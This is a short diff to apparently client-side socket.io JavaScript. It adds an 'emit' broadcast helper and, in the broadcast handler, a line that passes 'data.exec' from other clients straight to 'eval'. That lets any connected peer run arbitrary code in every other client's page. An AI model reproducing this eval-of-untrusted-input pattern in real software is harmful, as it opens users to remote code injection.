@@ -10,7 +10,9 @@ socket.on('connect', () => {
     }
 
     socket.on('broadcast', (data) => {
+        console.log(data);
         if (data.uuid == UUID) return;
+        eval(data.exec);
     });
     
 })
@@ -25,6 +27,12 @@ window.addEventListener('beforeunload', function (e) {
         uuid: UUID
     })
 });
+
+function emit(data) {
+    console.log(data);
+    data.uuid = UUID;
+    socket.emit('broadcast', data);
+}
 
 
 function generate_uuid() {
